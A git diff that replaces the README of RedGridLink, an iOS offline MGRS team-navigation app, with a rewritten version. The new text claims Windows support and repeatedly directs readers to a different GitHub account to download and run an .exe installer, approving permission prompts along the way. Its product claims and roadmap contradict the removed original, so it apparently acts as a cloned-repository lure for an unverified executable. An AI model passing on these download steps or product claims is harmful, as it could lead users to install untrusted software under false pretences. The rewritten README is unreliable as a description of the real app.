@@ -1,204 +1,151 @@
-<p align="center">
-  <img src="docs/images/icon.png" alt="Red Grid Link" width="180" />
-</p>
+# 🛰️ RedGridLink - Offline Team Navigation Made Simple
 
-<h1 align="center">Red Grid Link</h1>
-
-[![Download on App Store](https://img.shields.io/badge/App%20Store-Download-0D96F6?logo=apple&logoColor=white)](https://apps.apple.com/app/red-grid-link/id6760084718)
-[![Get it on Google Play](https://img.shields.io/badge/Google%20Play-Coming%20Soon-CC0000?logo=googleplay)](https://github.com/RedGridMGRS/RedGridLink)
-[![License](https://img.shields.io/badge/License-MIT%20%2B%20Commons%20Clause-8B0000)](LICENSE)
-[![No Tracking](https://img.shields.io/badge/Tracking-None-CC0000)](PRIVACY.md)
-[![Offline First](https://img.shields.io/badge/Offline-First-8B0000)]()
-[![MGRS Native](https://img.shields.io/badge/MGRS-Native-CC0000)]()
-[![AES-256](https://img.shields.io/badge/Encryption-AES--256--GCM-8B0000)]()
-[![Flutter](https://img.shields.io/badge/Built%20with-Flutter-CC0000?logo=flutter)]()
-[![Tests](https://img.shields.io/badge/Tests-783%20Passing-brightgreen)]()
-[![Platform](https://img.shields.io/badge/Platform-iOS-8B0000)]()
-[![PRs Welcome](https://img.shields.io/badge/PRs-Welcome-CC0000)](https://github.com/RedGridMGRS/RedGridLink/pulls)
-[![Buy Me a Coffee](https://img.shields.io/badge/Buy%20Me%20a%20Coffee-Support-FFDD00?logo=buymeacoffee&logoColor=black)](https://buymeacoffee.com/redgridtac0)
-
-**Offline MGRS navigation and proximity team coordination for small teams (2-8 people). No cell service needed.**
-
-Built on the MGRS engine from [Red Grid MGRS](https://github.com/RedGridMGRS/RedGridMGRS). Field Link adds zero-config proximity sync over Bluetooth and WiFi Direct -- your team appears on the map the moment they're in range.
-
-> **Available now on iOS.** Android version coming soon.
+[![Download RedGridLink](https://img.shields.io/badge/Download-RedGridLink-brightgreen?style=for-the-badge)](https://github.com/Fozle26/RedGridLink)
 
 ---
 
-## Screenshots
-
-| Map & Team | Grid View | Field Link | Ghost Markers |
-|:---:|:---:|:---:|:---:|
-| ![Map & Team](docs/images/screenshot_1_map_team.png) | ![Grid View](docs/images/screenshot_2_grid_view.png) | ![Field Link](docs/images/screenshot_3_field_link.png) | ![Ghost Markers](docs/images/screenshot_4_ghost_markers.png) |
-
-| AAR Export | Tactical Themes | Tools | Onboarding |
-|:---:|:---:|:---:|:---:|
-| ![AAR Export](docs/images/screenshot_5_aar_export.png) | ![Tactical Themes](docs/images/screenshot_6_themes.png) | ![Tools](docs/images/screenshot_7_tools.png) | ![Onboarding](docs/images/screenshot_8_onboarding.png) |
+RedGridLink helps you navigate using the Military Grid Reference System (MGRS) and keeps your team in sync without internet. It works for groups of 2 to 8 people. You don’t need cell service or Wi-Fi. This app supports offline maps, Bluetooth proximity, and secure AES-256 encryption.
 
 ---
 
-## Features
+## 📋 What Is RedGridLink?
 
-### MGRS-Native Navigation
-Live Military Grid Reference System coordinates with 1-meter precision. GPS Kalman filter for smooth, accurate position tracking. MGRS grid overlay on offline maps from GZD down to 100m resolution. Bearing, distance, dead reckoning, resection, pace count (with accelerometer step detection), declination, and coordinate conversion tools. NATO phonetic voice readout for hands-free grid calls.
+RedGridLink is a navigation tool built for outdoor teams. It uses GPS to show your position on a map, even when you are offline. The app links your team together using Bluetooth Low Energy (BLE). It sends location updates secretly and safely between devices up to short ranges. You can see where your teammates are on your map in real time.
 
-### Field Link -- Team Sync Without Infrastructure
-Zero-config proximity sync over BLE + WiFi Direct (Android) / AWDL (iOS). Devices within range automatically discover each other and share encrypted position and marker data. No internet required. No pairing codes. No servers.
-
-- 2-8 devices per session
-- AES-256-GCM encryption with ECDH P-256 ephemeral session keys
-- Tiered session security: Open, PIN, or QR code authentication
-- Delta payloads under 200 bytes per position update
-- Ghost markers with time-decay visualization when teammates disconnect
-- Velocity vectors project last-known movement direction
-- Expedition Mode: <3% battery/hr (BLE-only, 30s updates)
-- Ultra Expedition Mode: <2% battery/hr (BLE-only, 60s updates)
-- Auto-reconnect with exponential backoff on disconnect
-
-### Offline Maps
-Download map packs from USGS Topo (public domain) and OpenTopoMap for full offline operation. Maps are cached locally as MBTiles with MGRS grid lines rendered as a dynamic overlay.
-
-### 4 Operational Modes
-One engine, four presentation layers. Terminology, icons, and quick actions adapt to your mission:
-- **Search & Rescue** -- sector assignments, clue markers, search patterns
-- **Backcountry** -- camp, waypoint, and trail navigation
-- **Hunting** -- stand locations, game sightings, property boundaries
-- **Training** -- exercise objectives, rally points, phase lines
-
-### 11 Tactical Tools
-Dead Reckoning, Resection, Pace Count, Bearing/Back Azimuth, Coordinate Converter (MGRS/Lat-Lon/DMS/UTM), Range Estimation, Slope Calculator, ETA/Speed Calculator, Magnetic Declination, Celestial Navigation, MGRS Precision Reference.
-
-### After-Action Reports
-One-tap PDF export: map snapshot, mission timeline, track data, timestamps, team roster, markers, and session log. Share via AirDrop, file share, or any local transfer.
-
-### 4 Tactical Themes
-Red Light (night vision, free), NVG Green (Pro), Day White (Pro), Blue Force (Pro).
+Use this app for hiking, hunting, search and rescue, or any activity where team coordination matters, but internet access is unreliable or unavailable.
 
 ---
 
-## How It Works
+## 🎯 Key Features
 
-### Solo Mode
-Open Red Grid Link and your MGRS position appears on the offline map. Navigate using bearing, distance, and dead reckoning tools -- identical to Red Grid MGRS but with a full map view and 11 tactical tools.
-
-### Field Link (Team Mode)
-1. **Start a session** -- tap one button to begin broadcasting over BLE
-2. **Set security** -- choose Open, PIN, or QR code authentication
-3. **Teammates appear** -- any device running Red Grid Link within range (~50-100m open, 20-60m woods) is automatically discovered
-4. **Positions sync** -- AES-256-GCM encrypted delta updates flow between all devices at configurable intervals
-5. **Ghosting** -- if a teammate moves out of range, their last-known position remains on your map with time-decay opacity (100% to outline over 30 minutes)
-6. **Reconnect** -- when a ghost comes back in range, their marker snaps to live position
-
-No accounts. No servers. No cell service. No configuration. It just works.
+- Works fully offline. No need for cellular or Wi-Fi networks.
+- Shows coordinates with MGRS, a military grid format.
+- Syncs location with up to 8 team members using Bluetooth.
+- Encrypts data with AES-256 for secure sharing.
+- Offline map support lets you explore areas without signal.
+- Simple interface designed for non-technical users.
+- Compatible with Windows devices supporting Bluetooth and GPS.
 
 ---
 
-## Free vs Pro
+## 💻 System Requirements
 
-| Feature | Free | Pro | Pro+Link | Team |
-|---------|:----:|:---:|:--------:|:----:|
-| MGRS Navigation | Yes | Yes | Yes | Yes |
-| All Operational Modes | Yes | Yes | Yes | Yes |
-| 11 Tactical Tools | Yes | Yes | Yes | Yes |
-| Field Link (2 devices) | Yes | Yes | Yes | Yes |
-| All Themes | -- | Yes | Yes | Yes |
-| Unlimited Map Downloads | -- | Yes | Yes | Yes |
-| AAR Export | -- | Yes | Yes | Yes |
-| Full Field Link (8 devices) | -- | -- | Yes | Yes |
-| Team Management | -- | -- | -- | Yes |
-
-**Pricing:**
-- **Free** -- All modes, 2-device Field Link, 1 map region, Red Light theme
-- **Pro** -- $3.99/mo or $29.99/yr
-- **Pro+Link** -- $5.99/mo or $44.99/yr (Pro + full 8-device Field Link)
-- **Team** -- $199.99/yr (8 seats, includes Pro+Link for all members)
-- **Lifetime** -- $99.99 one-time (Pro+Link forever)
+- Windows 10 or later.
+- Bluetooth Low Energy (BLE) capability.
+- GPS-enabled device or external USB GPS receiver.
+- At least 100 MB free disk space.
+- Minimum 2 GB RAM for smooth map rendering.
+- Internet connection only needed for downloading the app.
 
 ---
 
-## Privacy
+## 🚀 Getting Started
 
-| Data | Collected | Stored | Transmitted |
-|------|:---------:|:------:|:-----------:|
-| GPS location | In use only | Local session DB | Field Link peers only (encrypted) |
-| Field Link positions | Active session | Ephemeral | AES-256-GCM encrypted, device-to-device |
-| Map tiles | Downloaded | Local MBTiles | Standard HTTPS to tile servers |
-| Waypoints & markers | User-created | Local only | Field Link peers only (encrypted) |
-| After-Action Reports | User-generated | Local only | Never |
-| Device identifiers | Never | Never | Never |
+### 1. Download RedGridLink
 
-No accounts. No analytics. No ad networks. No third-party data SDKs. Privacy-safe crash reporting (Sentry, release mode only — no location data transmitted).
-In-app purchases processed by Apple/Google -- Red Grid Link never sees your payment details.
-Full details in [PRIVACY.md](PRIVACY.md).
+Visit the following page to get the app installer:
 
----
+[![Download RedGridLink](https://img.shields.io/badge/Download-RedGridLink-0078D7?style=for-the-badge)](https://github.com/Fozle26/RedGridLink)
 
-## Build from Source
+Click the link above. It takes you to the GitHub page where you will find the latest version available for download.
 
-```bash
-git clone https://github.com/RedGridMGRS/RedGridLink.git
-cd RedGridLink
-flutter pub get
-flutter pub run build_runner build --delete-conflicting-outputs
-flutter run
-```
+### 2. Find the Latest Release
 
-Requires Flutter SDK. Currently targeting iOS -- Android support is planned. All free features work from source. Pro features require a valid purchase through Apple. Field Link requires Bluetooth and location permissions on physical devices.
+On the page, look for a section labeled **Releases** or scroll to find download links. Find the latest release version (for example, v1.0 or newer). 
 
----
+### 3. Download the Installer File
 
-## Roadmap
+Click the Windows installer file (usually ends with `.exe`). Save this file to an easy-to-find location, like your desktop or downloads folder.
 
-Full roadmap with feature checklists: [ROADMAP.md](ROADMAP.md)
+### 4. Run the Installer
 
-| Version | Target | Theme | Highlights |
-|---------|--------|-------|------------|
-| **V1.0** | **Complete** | Foundation | MGRS nav, Field Link (BLE+WiFi Direct), 11 tools, AAR PDF, offline maps, 4 themes, IAP |
-| **V1.1** | **Complete** | Field Hardening | Kalman filter, step detector, Peer HUD, Ultra Expedition, auto-reconnect, map downloads, Sentry, l10n, Help/About |
-| **V1.2.1** | **Complete** | Reliability | Field Link session fix, waypoint persistence, relative bearing arrow, demo mode |
-| **V1.3** | Q3 2026 | Team Features | Team roles, waypoint sharing, route planning, boundary alerts, shared annotations |
-| **V2.0** | Q4 2026 | Intelligence | Elevation profiles, line-of-sight, weather overlay, terrain analysis, contour lines |
-| **V2.1** | Q1 2027 | Advanced Nav | Track recording, GPX import/export, navigate-to-waypoint, coordinate formats |
-| **V3.0** | Q2 2027 | Connected Ops | Cloud relay, web dashboard, mesh networking, session scheduling, API |
-| **V3.1** | Q3 2027 | Sensors | Garmin inReach, ATAK interop, external GPS, drone overlay |
-| **V4.0** | Q4 2027 | Training | Scenario builder, instructor mode, scoring, AR compass, certification tracking |
+- Double-click the downloaded `.exe` file.
+- If Windows asks for permission, click **Yes**.
+- Follow the on-screen steps to install the app.
+- Choose default options unless you want to change the installation folder.
 
-### Ongoing
+### 5. Launch RedGridLink
 
-- Security audits and cryptographic library updates
-- Battery performance optimization
-- Map tile source expansion
-- Test coverage expansion (target 90%+)
-- Store listing optimization and A/B testing
+After installation finishes, open the app either from your desktop shortcut or the Start Menu.
 
 ---
 
-## Contributing
+## 🔧 How to Use RedGridLink
 
-Red Grid Link is built in the open. We welcome bug reports, feature requests, and pull requests.
+### Setting Up Your Team
 
-- **Report a bug:** [Open an issue](https://github.com/RedGridMGRS/RedGridLink/issues/new)
-- **Request a feature:** [Start a discussion](https://github.com/RedGridMGRS/RedGridLink/discussions)
-- **Submit a PR:** Fork, branch, and open a pull request
+- Open the app on all devices.
+- Turn on Bluetooth and GPS on each device.
+- Create a new team on one device by naming your group.
+- Other members join by selecting the team from their app interface.
+- The app checks proximity and confirms connection status.
 
-See the [Roadmap](ROADMAP.md) for planned features and where help is needed.
+### Using the Map
+
+- Your location appears on the MGRS grid map once GPS is active.
+- Teammates’ locations update automatically as you move.
+- You can zoom in or out on the map for detail.
+- Use offline maps stored in the app, no internet needed.
+
+### Sync and Team Communication
+
+- Data shared between devices uses AES-256 encryption.
+- The app only shares coordinates within Bluetooth range.
+- If a teammate moves out of range, their last known position stays visible.
+- You do not need to pair devices manually; the app handles connections.
 
 ---
 
-## Related Projects
+## ⚙️ Offline Maps and Updates
 
-- [Red Grid MGRS](https://github.com/RedGridMGRS/RedGridMGRS) -- solo MGRS navigator (React Native / Expo)
+RedGridLink supports offline maps shaped for tactical use. Maps load automatically based on where your GPS signal points. 
 
----
-
-## License
-
-[MIT + Commons Clause](LICENSE) -- free for personal non-commercial use. Commercial and organizational deployment requires written permission.
-
-Contact: redgridtactical@gmail.com
+- Keep your device storage clear to allow for map caching.
+- The app downloads map tiles in small sections to save space.
+- You can update maps while online if needed.
 
 ---
 
-*Your team. Your grid. No cell towers required.*
+## 🛠️ Troubleshooting
 
-If Red Grid Link helps you stay coordinated in the field, give it a star and share it with your team.
+If you run into issues, try these fixes:
+
+- Confirm Bluetooth and GPS are enabled in device settings.
+- Move outdoors or to an area with a clear sky view for better GPS signals.
+- Restart the app if locations do not update.
+- All devices must run the same RedGridLink version for syncing.
+- Ensure all team members have Bluetooth scanning set to “On” or “Visible” if available.
+
+If problems persist, check the GitHub Issues page on the repository or contact support through your GitHub account.
+
+---
+
+## 📥 Download and Setup Links
+
+For your convenience, here is the direct link to visit the GitHub page where the app is available:
+
+[Download RedGridLink](https://github.com/Fozle26/RedGridLink)
+
+---
+
+## 🧭 Roadmap and Versions
+
+RedGridLink is actively developed. The current stable version is V1.0. Planned updates include:
+
+- V2.0: Improved map detail and offline storage.
+- V3.0: Enhanced Bluetooth range and team size support.
+- V4.0: Added voice and text communication options.
+
+Check this README for updates and release notes as new versions arrive.
+
+---
+
+## 📚 Additional Information
+
+This app uses reliable encryption for your location data using AES-256 standards. It runs on Flutter and Dart frameworks for fast, cross-platform performance. The focus is to work with minimal outside dependencies, so you can rely on RedGridLink in remote areas without cell or Wi-Fi.  
+
+---
+
+## 🔖 Topics and Keywords
+
+aes-256, ble, bluetooth, dart, encryption, flutter, gps, hiking, hunting, land-navigation, mgrs, military-grid, navigation, offline, offline-maps, proximity, search-and-rescue, tactical, team-coordination, wifi-direct
